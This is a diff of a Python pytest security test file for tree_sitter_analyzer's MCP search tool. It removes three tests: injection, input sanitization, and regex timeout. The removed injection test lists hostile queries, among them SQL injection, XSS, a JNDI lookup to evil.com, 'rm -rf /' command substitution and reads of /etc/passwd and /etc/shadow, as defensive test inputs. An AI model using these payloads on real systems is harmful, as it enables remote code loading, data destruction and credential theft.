@@ -31,7 +31,6 @@ from tree_sitter_analyzer.mcp.tools.analyze_code_structure_tool import (
 from tree_sitter_analyzer.mcp.tools.analyze_scale_tool import AnalyzeScaleTool
 from tree_sitter_analyzer.mcp.tools.list_files_tool import ListFilesTool
 from tree_sitter_analyzer.mcp.tools.read_partial_tool import ReadPartialTool
-from tree_sitter_analyzer.mcp.tools.search_content_tool import SearchContentTool
 from tree_sitter_analyzer.security.validator import SecurityValidator
 
 
@@ -148,34 +147,6 @@ class TestInputValidation:
             await tool.execute({"file_path": long_path})
         assert len(long_path) == 10003
 
-    @pytest.mark.asyncio
-    async def test_special_character_injection(self, safe_project_structure):
-        """特殊文字注入攻撃の防御テスト"""
-        tool = SearchContentTool()
-
-        malicious_queries = [
-            "'; DROP TABLE users; --",
-            "<script>alert('xss')</script>",
-            "${jndi:ldap://evil.com/a}",
-            "{{7*7}}",
-            "$(rm -rf /)",
-            "`rm -rf /`",
-            "../../etc/passwd && cat /etc/shadow",
-        ]
-
-        for malicious_query in malicious_queries:
-            # 悪意のあるクエリでも安全に処理されることを確認
-            result = await tool.execute(
-                {
-                    "roots": [safe_project_structure],
-                    "query": malicious_query,
-                    "max_count": 1,
-                }
-            )
-            # エラーが発生するか、安全に処理されるかのいずれか
-            assert result["success"] is True or "error" in result
-
-
 class TestProjectBoundaryProtection:
     """プロジェクト境界保護の検証"""
 
@@ -264,30 +235,6 @@ class TestSecurityBestPractices:
         assert hasattr(security_validator, "validate_path")
         assert hasattr(security_validator, "is_safe_path")
 
-    @pytest.mark.requires_ripgrep
-    @pytest.mark.asyncio
-    async def test_input_sanitization(self, safe_project_structure):
-        """入力サニタイゼーションの確認"""
-        tool = SearchContentTool()
-
-        # 様々な入力パターンをテスト
-        test_inputs = [
-            "normal_query",
-            "query with spaces",
-            "query-with-dashes",
-            "query_with_underscores",
-            "query.with.dots",
-            "query123",
-            "UPPERCASE_QUERY",
-        ]
-
-        for test_input in test_inputs:
-            result = await tool.execute(
-                {"roots": [safe_project_structure], "query": test_input, "max_count": 1}
-            )
-            # 正常な入力は処理される
-            assert result["success"] is True
-
     @pytest.mark.requires_fd
     @pytest.mark.asyncio
     async def test_resource_limits(self, safe_project_structure):
@@ -308,27 +255,6 @@ class TestSecurityBestPractices:
             assert (
                 result["count"] <= 10000
             )  # ratchet: nondeterministic — implementation-defined upper limit, not a fixture count
-
-    @pytest.mark.requires_ripgrep
-    @pytest.mark.asyncio
-    async def test_timeout_protection(self, safe_project_structure):
-        """タイムアウト保護の確認"""
-        tool = SearchContentTool()
-
-        # 複雑な正規表現でタイムアウトをテスト
-        complex_regex = r"(a+)+b"  # 潜在的にバックトラッキングを引き起こす
-
-        result = await tool.execute(
-            {
-                "roots": [safe_project_structure],
-                "query": complex_regex,
-                "timeout_ms": 1000,  # 1秒のタイムアウト
-                "max_count": 1,
-            }
-        )
-
-        # タイムアウトまたは安全な処理が行われることを確認
-        assert result["success"] is True or "timeout" in str(result).lower()
 
     @pytest.mark.asyncio
     async def test_concurrent_request_handling(self, safe_project_structure):
